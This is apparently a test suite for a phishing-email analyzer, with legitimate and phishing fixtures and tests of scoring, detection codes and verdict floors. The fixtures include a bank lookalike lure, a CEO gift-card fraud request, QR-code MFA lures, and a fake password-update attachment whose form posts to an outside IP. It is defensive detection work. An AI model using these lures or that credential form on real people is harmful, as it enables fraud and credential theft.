import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { analyze, type AnalysisResult } from '../src/analyze'
import { computeScore } from '../src/score'
import { buildReport } from '../src/report'
import { WEIGHTS, FLOOR_RULES } from '../src/weights'
import { SAMPLES } from '../src/samples'
import type { Finding, Severity } from '../src/types'

/**
 * Regression suite built from the accuracy probe battery (L = legitimate, P = phishing) plus the new
 * negative tests. Free-mail providers appear here only as test fixtures; they are never used in UI samples.
 */
const NOW = Date.parse('2026-10-24T03:00:00Z')
const mail = (headers: string[], html?: string, text = 'Hello') =>
  headers.join('\r\n') + '\r\n' + (html ? 'Content-Type: text/html; charset=UTF-8\r\n\r\n' + html : 'Content-Type: text/plain; charset=UTF-8\r\n\r\n' + text) + '\r\n'
const base = (from: string, extra: string[] = []) => ['Date: Sat, 24 Oct 2026 02:00:00 +0000', `From: ${from}`, 'To: amirul@example.com', 'Message-ID: <abc123@mail.example>', 'MIME-Version: 1.0', ...extra]
const run = (raw: string): AnalysisResult => {
  const r = analyze(raw, NOW)
  if (!r.ok) throw new Error(r.message)
  return r
}
const codesOf = (r: AnalysisResult) => r.findings.filter((f) => f.points > 0).map((f) => f.code)

const L1 = mail(base('Google <no-reply@accounts.google.com>', ['Return-Path: <3abc@scoutcamp.bounces.google.com>', 'Authentication-Results: mx.google.com; dkim=pass header.i=@accounts.google.com header.s=20230601; spf=pass (google.com: domain of 3abc@scoutcamp.bounces.google.com designates 209.85.220.69 as permitted sender) smtp.mailfrom=3abc@scoutcamp.bounces.google.com; dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=accounts.google.com', 'Subject: Security alert']), '<p>A new sign-in on Windows.</p><a href="https://accounts.google.com/AccountChooser?Email=a@b.com">Check activity</a>')
const L2 = mail(base('Shopee <noreply@mail.shopee.com.my>', ['Reply-To: no-reply@shopee.com.my', 'Return-Path: <bounce@mail.shopee.com.my>', 'Authentication-Results: mx.example.com; dkim=pass header.d=mail.shopee.com.my; spf=pass smtp.mailfrom=bounce@mail.shopee.com.my; dmarc=pass header.from=mail.shopee.com.my', 'List-Unsubscribe: <https://mail.shopee.com.my/unsub?u=1>', 'Subject: Flash sale ends tonight!']), '<p>Hurry! Last chance, sale ends in 24 hours</p><a href="https://click.mail.shopee.com.my/?qs=abcdef">Shop now at shopee.com.my</a><img src="https://track.mail.shopee.com.my/o.gif" width="1" height="1">')
const L3 = mail(base('Maybank2u <alert@maybank2u.com.my>', ['Authentication-Results: mx.example.com; dkim=pass header.d=maybank2u.com.my; spf=pass smtp.mailfrom=alert@maybank2u.com.my; dmarc=pass header.from=maybank2u.com.my', 'Subject: Transaction alert']), '<p>A transaction of RM50.00 was made. Please verify if this was not you.</p><a href="https://www.maybank2u.com.my/home">Login to Maybank2u</a>')
const L4 = mail(base('Alice <alice@university.example.edu>', ['Authentication-Results: mx.example.com; spf=softfail smtp.mailfrom=alice@university.example.edu; dkim=pass header.d=university.example.edu; dmarc=pass header.from=university.example.edu', 'Subject: [cs-list] Meeting notes']), undefined, 'Notes attached in the wiki: https://wiki.university.example.edu/notes')
const L5 = mail(base('Bob Lee <bob@company.example>', ['Subject: lunch?']), undefined, 'Want to grab lunch at 1pm?')
const L6 = mail(base('Example Shop <offers@mail.shop.example.com>', ['Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=mail.shop.example.com; dkim=pass header.d=mail.shop.example.com; dmarc=pass header.from=mail.shop.example.com', 'List-Unsubscribe: <https://shop.example.com/unsub>', 'Subject: Give the gift of choice']), '<p>Buy a gift card for a friend this festive season. Gift cards never expire and can be sent by email.</p><a href="https://shop.example.com/gift-cards">Shop gift cards</a><a href="https://shop.example.com/unsub">Unsubscribe</a>')
const P1 = mail(base('Maybank Security <support@maybank2u-secure.net>', ['Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=maybank2u-secure.net; dkim=none; dmarc=none', 'Subject: Your account has been suspended']), '<p>Dear customer, verify your account within 24 hours or it will be closed.</p><a href="http://maybank2u-secure.net/login">https://www.maybank2u.com.my/login</a>')
const P2 = mail(base('"Dato Ahmad (CEO)" <ceo.company.office@gmail.com>', ['Reply-To: ahmad.private@outlook.com', 'Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com', 'Subject: Urgent request']), undefined, 'Hi, are you available? I need you to buy 5 gift cards for a client today. Keep this confidential. Reply when you can.')
const P3 = ['Date: Sat, 24 Oct 2026 02:00:00 +0000', 'From: Microsoft Support <no-reply@msft-support.example.net>', 'To: amirul@example.com', 'Subject: Password expires today', 'MIME-Version: 1.0', 'Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=msft-support.example.net; dkim=none; dmarc=fail header.from=msft-support.example.net', 'Content-Type: multipart/mixed; boundary="B"', '', '--B', 'Content-Type: text/plain', '', 'Your password expires today. Open the attached form to keep your password.', '--B', 'Content-Type: text/html; name="Password_Update.html"', 'Content-Disposition: attachment; filename="Password_Update.html"', '', '<form action="http://203.0.113.9/p.php"><input type=password></form>', '--B--', ''].join('\r\n')
const qrMail = (body: string) => mail(base('IT Helpdesk <helpdesk@company-it.example.org>', ['Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=company-it.example.org; dkim=pass header.d=company-it.example.org; dmarc=pass header.from=company-it.example.org', 'Subject: MFA update required']), body)
const P4 = qrMail('<p>Scan the QR code below to re-enrol MFA.</p><img src="https://cdn.example.org/qr.png">')

describe('probe battery: legitimate mail stays quiet', () => {
  it.each([
    ['L1 Google security alert, all auth pass', L1, 0, 'No obvious red flags'],
    ['L2 marketing via ESP tracking links', L2, 0, 'No obvious red flags'],
    ['L3 bank notification from the real domain', L3, 0, 'No obvious red flags'],
    ['L4 mailing list, SPF softfail but DKIM+DMARC pass', L4, 8, 'Low risk'],
    ['L5 plain text from a colleague, no auth headers', L5, 4, 'No obvious red flags'],
    ['L6 retailer gift-card promotion, authenticated, List-Unsubscribe', L6, 0, 'No obvious red flags'],
  ])('%s', (_n, raw, score, label) => {
    const r = run(raw)
    expect(r.score.score).toBe(score)
    expect(r.score.score).toBeLessThan(25)
    expect(r.score.band.label).toBe(label)
    expect(r.score.band.label).not.toBe('Be careful')
    expect(r.score.floorReason).toBeUndefined()
    expect(codesOf(r).filter((c) => /^(C13|C14|C15|COMBO)/.test(c))).toEqual([])
  })
})

describe('probe battery: phishing is caught', () => {
  it('P1 bank lookalike with link-text mismatch reaches Likely phishing via the combination bonus', () => {
    const r = run(P1)
    expect(r.score.score).toBeGreaterThanOrEqual(75)
    expect(r.score.band.label).toBe('Likely phishing')
    expect(codesOf(r)).toEqual(expect.arrayContaining(['C3.brand_in_name', 'C4.brand_in_domain', 'C5.mismatch', 'COMBO.brand_spoof']))
  })
  it('P2 CEO gift-card BEC is no longer a false negative', () => {
    const r = run(P2)
    expect(r.score.score).toBeGreaterThanOrEqual(50)
    expect(['Suspicious', 'Likely phishing']).toContain(r.score.band.label)
    expect(codesOf(r)).toEqual(expect.arrayContaining(['C13.authority_freemail', 'C14.social_many', 'COMBO.exec_payment']))
    // authentication passed (on gmail.com) but must not earn good signs
    expect(r.findings.some((f) => f.severity === 'good')).toBe(false)
  })
  it('P3 Microsoft 365 password expiry stays Likely phishing', () => {
    const r = run(P3)
    expect(r.score.score).toBeGreaterThanOrEqual(75)
    expect(r.score.band.label).toBe('Likely phishing')
    expect(codesOf(r)).not.toContain('COMBO.brand_spoof') // no link-text mismatch here, so no bonus
  })
  it('P4 image-only QR lure on an authenticated lookalike is flagged, not "fine"', () => {
    const r = run(P4)
    expect(codesOf(r)).toContain('C15.qr_lure')
    expect(r.score.score).toBeGreaterThanOrEqual(15)
    expect(r.score.band.label).toBe('Be careful')
    expect(r.score.floorReason).toBeTruthy()
    expect(r.findings.some((f) => f.severity === 'good')).toBe(false)
  })
})

describe('C13 executive / authority impersonation', () => {
  const from = (f: string, extra: string[] = []) => run(mail(base(f, ['Subject: hi', ...extra]), undefined, 'Please call me.'))
  it('fires for a title plus a free-mail address', () => {
    const r = from('"Managing Director" <md.office@yahoo.com>')
    expect(codesOf(r)).toContain('C13.authority_freemail')
    const f = r.findings.find((x) => x.code === 'C13.authority_freemail')!
    expect(f.severity).toBe('high')
    expect(f.points).toBe(18)
    expect(f.why.length).toBeGreaterThan(20)
    expect(f.action).toMatch(/phone|chat/i)
  })
  it.each(['Tan Sri Lim <office@icloud.com>', 'Dato\' Sri Ahmad <a@hotmail.com>', 'Pengarah Urusan <p@proton.me>', 'Tuan Hassan <h@live.com>', 'Puan Aisha <a@mail.com>', 'CFO Lee <l@protonmail.com>'])('fires for %s', (f) => {
    expect(codesOf(from(f))).toContain('C13.authority_freemail')
  })
  it('fires when the domain differs from Reply-To even without a free-mail provider', () => {
    const r = from('Finance Team <finance@company.example.com>', ['Reply-To: payments@other.example.net'])
    expect(codesOf(r)).toContain('C13.authority_freemail')
  })
  it('does not fire on a title with a matching company address and no Reply-To', () => {
    expect(codesOf(from('"Ahmad (CEO)" <ahmad@company.example.com>'))).not.toContain('C13.authority_freemail')
    expect(codesOf(from('HR Team <hr@company.example.com>', ['Reply-To: hr@mail.company.example.com']))).not.toContain('C13.authority_freemail')
  })
  it('does not fire on ordinary free-mail senders, lower-case acronyms or mid-name honorifics', () => {
    expect(codesOf(from('Alice Tan <alice@gmail.com>'))).not.toContain('C13.authority_freemail')
    expect(codesOf(from('mdm <x@gmail.com>'))).not.toContain('C13.authority_freemail')
    expect(codesOf(from('Alice Dato <alice@gmail.com>'))).not.toContain('C13.authority_freemail')
  })
})

describe('C14 payment / gift-card / secrecy lures', () => {
  const body = (t: string, extra: string[] = [], subject = 'Hello') => run(mail(base('Sam <sam@example.com>', ['Subject: ' + subject, ...extra]), undefined, t))
  it('one group is low, two medium, three or more high', () => {
    const one = body('Remember the gift card for Sam.')
    expect(codesOf(one)).toContain('C14.social_one')
    expect(one.findings.find((f) => f.check === 'C14')!.severity).toBe('low')
    const two = body('Please buy a gift card. Keep this confidential.')
    expect(codesOf(two)).toContain('C14.social_two')
    expect(two.findings.find((f) => f.check === 'C14')!.severity).toBe('medium')
    const many = body('Are you available? Buy a gift card and keep this confidential.')
    expect(codesOf(many)).toContain('C14.social_many')
    expect(many.findings.find((f) => f.check === 'C14')!.severity).toBe('high')
  })
  it('reads Bahasa Malaysia phrases', () => {
    const r = body('Saya perlukan kad hadiah segera. Jangan beritahu sesiapa, rahsiakan perkara ini. Buat pindahan wang hari ini.')
    expect(codesOf(r)).toContain('C14.social_many')
  })
  it('detects change-of-bank-details fraud in an HTML body', () => {
    const r = run(mail(base('Accounts <accounts@supplier.example.com>', ['Subject: Invoice', 'Content-Type: text/html; charset=utf-8']), '<p>We have a <b>new account number</b>. Please do the wire transfer to it.</p>'))
    expect(codesOf(r)).toContain('C14.social_two')
  })
  it('reads the subject line', () => {
    expect(codesOf(body('Reply when free.', [], 'Urgent request'))).toContain('C14.social_one')
  })
  it('does not fire on ordinary mail', () => {
    expect(codesOf(body('Meeting moved to 3pm. Bring the quarterly report.')).filter((c) => c.startsWith('C14'))).toEqual([])
  })
  it('does not fire on a single mention in an authenticated promotion with List-Unsubscribe', () => {
    expect(codesOf(run(L6)).filter((c) => c.startsWith('C14'))).toEqual([])
    // ...but a bulk-looking message with a real pattern (3+ groups) still does
    const r = body('Are you available? Buy a gift card and keep this confidential.', ['List-Unsubscribe: <https://example.com/u>'])
    expect(codesOf(r)).toContain('C14.social_many')
  })
})

describe('C15 QR-code lures', () => {
  it('fires on scan wording + image + no links, and does not claim to decode the image', () => {
    const f = run(P4).findings.find((x) => x.code === 'C15.qr_lure')!
    expect(f.severity).toBe('medium')
    expect(f.points).toBe(15)
    expect(f.action).toMatch(/do not scan it with a phone/i)
    expect(f.action).toMatch(/IT/)
    expect(f.evidence).toMatch(/does not read or decode/i)
  })
  it('fires with an inline image attachment instead of an HTML image', () => {
    const raw = ['Date: Sat, 24 Oct 2026 02:00:00 +0000', 'From: IT <it@company-it.example.org>', 'To: a@example.com', 'Subject: Pay now', 'Message-ID: <q@x.example>', 'MIME-Version: 1.0', 'Content-Type: multipart/related; boundary="R"', '', '--R', 'Content-Type: text/plain', '', 'Use your phone camera to scan the QR code and continue to payment.', '--R', 'Content-Type: image/png', 'Content-Disposition: inline; filename="qr.png"', 'Content-Transfer-Encoding: base64', '', 'iVBORw0KGgo=', '--R--', ''].join('\r\n')
    expect(codesOf(run(raw))).toContain('C15.qr_lure')
  })
  it('fires in Bahasa Malaysia', () => {
    expect(codesOf(run(qrMail('<p>Imbas kod QR di bawah untuk sahkan akaun anda.</p><img src="https://cdn.example.org/q.png">')))).toContain('C15.qr_lure')
  })
  it('does not fire without an image', () => {
    expect(codesOf(run(qrMail('<p>Scan the QR code to re-enrol MFA.</p>')))).not.toContain('C15.qr_lure')
  })
  it('does not fire on a link-rich message that mentions a QR code', () => {
    const links = [1, 2, 3, 4].map((i) => `<a href="https://shop.example.com/p${i}">Item ${i}</a>`).join('')
    expect(codesOf(run(qrMail(`<p>Scan the QR code in the app to pay in store.</p>${links}<img src="https://cdn.example.org/a.png">`)))).not.toContain('C15.qr_lure')
  })
  it('does not fire on an image email that never mentions scanning', () => {
    expect(codesOf(run(qrMail('<p>Our new logo.</p><img src="https://cdn.example.org/a.png">')))).not.toContain('C15.qr_lure')
  })
})

describe('verdict floor', () => {
  const f = (check: string, points: number, severity: Severity = 'low'): Finding => ({ id: check + points + severity, check, code: 'x', severity, title: 't', evidence: '', why: '', action: '', points })
  it('a high-severity finding can never read as fine, even with a tiny score', () => {
    const s = computeScore([f('C10', 4, 'high')])
    expect(s.score).toBe(4)
    expect(s.band.label).toBe('Be careful')
    expect(s.floorReason).toMatch(/high-severity/)
  })
  it('12+ points from two or more different checks floors to Be careful', () => {
    expect(computeScore([f('C7', 6), f('C11', 6)]).band.label).toBe('Be careful')
    expect(computeScore([f('C7', 6), f('C7', 6)]).band.label).toBe('No obvious red flags') // same check
    expect(computeScore([f('C7', 5), f('C11', 6)]).band.label).toBe('No obvious red flags') // under 12
  })
  it('a lone medium finding worth 12+ floors; a smaller one reads Low risk', () => {
    expect(computeScore([f('C2', 12, 'medium')]).band.label).toBe('Be careful')
    expect(computeScore([f('C1', 8, 'medium')]).band.label).toBe('Low risk')
    expect(computeScore([f('C1', 8, 'medium')]).band.id).toBe('fine')
  })
  it('No obvious red flags only when score < 25 and no medium/high findings; numeric bands elsewhere unchanged', () => {
    expect(computeScore([]).band.label).toBe('No obvious red flags')
    expect(computeScore([f('C7', 4)]).band.label).toBe('No obvious red flags')
    expect(computeScore([f('C4', 30)]).band.label).toBe('Be careful')
    expect(computeScore([f('C4', 40), f('C5', 20)]).band.label).toBe('Suspicious')
    expect(computeScore([f('C4', 40), f('C5', 30), f('C2', 5)]).band.label).toBe('Likely phishing')
  })
  it('the report states the floor and the word "Looks fine" is gone', () => {
    const md = buildReport(run(P4))
    expect(md).toContain('**Verdict:** Be careful')
    expect(md).toMatch(/Verdict floor applied/)
    expect(buildReport(run(L5))).toContain('**Verdict:** No obvious red flags')
    expect(buildReport(run(L5))).not.toMatch(/Looks fine/)
    expect(FLOOR_RULES).toHaveLength(3)
  })
})

describe('combination bonuses', () => {
  it('brand spoof bonus needs all three signals', () => {
    expect(codesOf(run(P1))).toContain('COMBO.brand_spoof')
    // drop the link mismatch: honest link text, same lookalike domain
    const noMismatch = P1.replace('>https://www.maybank2u.com.my/login<', '>maybank2u-secure.net/login<')
    expect(codesOf(run(noMismatch))).not.toContain('COMBO.brand_spoof')
    expect(codesOf(run(L3))).not.toContain('COMBO.brand_spoof')
  })
  it('executive + payment bonus needs both findings', () => {
    expect(codesOf(run(P2))).toContain('COMBO.exec_payment')
    const noAsk = P2.replace(/Hi, are you available.*\./, 'Hi, please call me.').replace('Subject: Urgent request', 'Subject: hello')
    expect(codesOf(run(noAsk))).not.toContain('COMBO.exec_payment')
  })
})

describe('fourth sample: CEO gift-card scam (invented, reserved domains only)', () => {
  const sample = SAMPLES.find((s) => s.id === 'ceo')!
  it('exists, is plain text, and scores Suspicious or worse through the Reply-To path', () => {
    expect(sample).toBeTruthy()
    const r = run(sample.raw)
    expect(r.email.html).toBeFalsy()
    expect(r.score.score).toBeGreaterThanOrEqual(50)
    expect(codesOf(r)).toEqual(expect.arrayContaining(['C13.authority_freemail', 'C14.social_many', 'C2.replyto_mismatch']))
    expect(r.ctx.from?.domain).toBe('mail.example.test')
    expect(r.ctx.replyTo?.domain).toBe('personal-mail.test')
  })
  it('uses no real free-mail provider', () => {
    expect(sample.raw).not.toMatch(/gmail|outlook|hotmail|yahoo|icloud|proton|live\.com|mail\.com/i)
  })
})

describe('weights, panel and README stay in sync', () => {
  const readme = readFileSync(join(process.cwd(), 'README.md'), 'utf8')
  it.each(WEIGHTS.map((w) => [w.code, w] as const))('README lists %s', (_c, w) => {
    const pts = w.points > 0 ? `+${w.points}` : `${w.points}`
    expect(readme).toContain(`| ${w.check} | ${w.label} | ${pts} |`)
  })
  it('README documents the floor rules and the new checks', () => {
    for (const id of ['C13', 'C14', 'C15', 'COMBO']) expect(readme).toContain(`| ${id} |`)
    expect(readme).toContain('No obvious red flags')
    expect(readme).not.toContain('Looks fine')
  })
})
